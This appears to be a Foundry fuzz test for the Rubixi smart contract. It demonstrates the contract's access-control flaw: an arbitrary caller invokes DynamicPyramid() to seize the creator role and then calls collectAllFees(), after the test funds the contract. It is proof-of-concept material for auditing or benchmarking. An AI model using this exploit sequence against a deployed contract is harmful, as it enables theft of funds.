
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi rubixi;

    function setUp() public {
        rubixi = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c67);

        // Exclude the original deployer (the only intended privileged role)
        vm.assume(caller != address(rubixi));

        // Before: creator is the deployer (address(this))
        // Switch context to arbitrary caller and call DynamicPyramid
        vm.prank(caller);
        rubixi.DynamicPyramid();

        // After: creator should now be the arbitrary caller, proving unrestricted access
        // We assert by trying to collect fees as the new creator

        // First, send some ether to the contract to generate fees
        vm.deal(address(0xBEEF), 100 ether);
        vm.prank(address(0xBEEF));
        (bool sent, ) = address(rubixi).call{value: 0.5 ether}("");
        require(sent, "funding failed");

        // Now arbitrary caller (who called DynamicPyramid) should be able to collect fees
        vm.prank(caller);
        rubixi.collectAllFees();
    }
}
